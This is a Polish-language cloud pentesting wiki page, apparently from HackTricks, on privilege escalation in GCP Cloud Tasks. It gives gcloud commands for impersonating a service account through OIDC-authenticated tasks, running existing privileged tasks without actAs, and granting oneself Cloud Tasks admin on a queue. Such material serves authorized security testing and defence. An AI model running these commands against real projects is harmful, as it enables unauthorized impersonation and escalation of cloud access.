# GCP - Cloud Tasks Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Tasks

### `cloudtasks.tasks.create`, `iam.serviceAccounts.actAs`

Atakujący z tymi uprawnieniami może **podszywać się pod inne konta serwisowe** poprzez tworzenie zadań, które wykonują się z tożsamością określonego konta serwisowego. Pozwala to na wysyłanie **uwierzytelnionych żądań HTTP do usług Cloud Run lub Cloud Functions chronionych przez IAM**.

<details><summary>Utwórz Cloud Task podszywając się pod konto serwisowe</summary>
```bash
gcloud tasks create-http-task \
task-$(date '+%Y%m%d%H%M%S') \
--location us-central1 \
--queue <queue_name> \
--url 'https://<service_name>.us-central1.run.app' \
--method POST \
--header 'X-Hello: world' \
--body-content '{"hello":"world"}' \
--oidc-service-account-email <account>@<project_id>.iam.gserviceaccount.com
```
</details>

### `cloudtasks.tasks.run`, `cloudtasks.tasks.list`

Atakujący posiadający te uprawnienia może **uruchamiać istniejące zaplanowane zadania** bez posiadania uprawnień do konta usługi powiązanego z zadaniem. Umożliwia to wykonanie zadań, które zostały wcześniej utworzone przy użyciu kont usług o wyższych uprawnieniach.

<details><summary>Uruchom istniejący Cloud Task bez uprawnienia actAs</summary>
```bash
gcloud tasks run projects/<project_id>/locations/us-central1/queues/<queue_name>/tasks/<task_id>
```
</details>

Podmiot wykonujący to polecenie **nie potrzebuje uprawnienia `iam.serviceAccounts.actAs`** do konta usługi przypisanego do zadania. Jednakże umożliwia to jedynie uruchamianie istniejących zadań — nie daje uprawnień do tworzenia ani modyfikacji zadań.

### `cloudtasks.queues.setIamPolicy`

Atakujący posiadający to uprawnienie może **przyznać sobie lub innym podmiotom Cloud Tasks roles** na konkretnych kolejkach, potencjalnie eskalując do `roles/cloudtasks.admin`, które zawiera możliwość tworzenia i uruchamiania zadań.

<details><summary>Nadaj rolę Cloud Tasks admin na kolejce</summary>
```bash
gcloud tasks queues add-iam-policy-binding \
<queue_name> \
--location us-central1 \
--member serviceAccount:<account>@<project_id>.iam.gserviceaccount.com \
--role roles/cloudtasks.admin
```
</details>

Pozwala to atakującemu nadać pełne uprawnienia administratora Cloud Tasks na kolejce dowolnemu service accountowi, którym zarządza.

## Referencje

- [Google Cloud Tasks Documentation](https://cloud.google.com/tasks/docs)

{{#include ../../../banners/hacktricks-training.md}}
